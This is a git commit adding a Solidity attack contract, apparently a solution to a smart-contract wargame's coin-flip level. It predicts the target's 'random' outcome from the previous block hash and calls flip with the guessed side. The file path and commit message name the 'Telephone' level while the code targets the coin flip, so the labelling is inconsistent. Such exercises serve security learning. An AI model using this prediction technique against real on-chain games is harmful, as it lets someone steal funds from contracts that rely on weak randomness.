c5b9f549922149761d34d3b3ac8dbf9acbab421c
sarobinson2001 <sarobinson2011@gmail.com>
2023-08-18 12:07:29 +0100

    04-Telephone added

---
+++ contracts/04-Telephone/04-attack.sol
@@ -0,0 +1,26 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+import "interfaces/icoinflip.sol";
+
+contract Attack {
+    ICoinFlip private immutable target;
+    uint256 FACTOR =
+        57896044618658097711785492504343953926634992332820282019728792003956564819968;
+
+    constructor(address _target) {
+        target = ICoinFlip(_target);
+    }
+
+    function flip() external {
+        bool guess = _guess();
+        require(target.flip(guess), "guess failed");
+    }
+
+    function _guess() private view returns (bool) {
+        uint256 blockValue = uint256(blockhash(block.number - 1));
+        uint256 coinFlip = blockValue / FACTOR;
+        bool side = coinFlip == 1 ? true : false;
+        return side;
+    }
+}
